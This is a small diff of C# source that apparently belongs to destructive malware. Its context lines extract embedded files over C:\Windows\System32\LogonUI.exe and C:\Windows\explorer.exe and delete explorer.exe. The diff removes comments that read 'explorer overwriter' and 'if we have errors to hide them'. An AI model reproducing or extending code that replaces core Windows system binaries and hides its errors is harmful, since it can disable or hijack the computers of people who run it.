@@ -156,7 +156,7 @@ namespace d {
 
                         Extract("d", @"C:\Windows\System32", "Resources", "LogonUI.exe");
                     }
-                    //-------------------------------------------------------------------------                    
+                           
                     try
                     {
                         File.Delete("explorer.exe");
@@ -168,11 +168,7 @@ namespace d {
                         Extract("d", @"C:\Windows", "Resources", "explorer.exe");
                     }
 
-                    //explorer overwriter
-
-
-
-                    //if we have errors to hide them
+                  
                 }
 
 
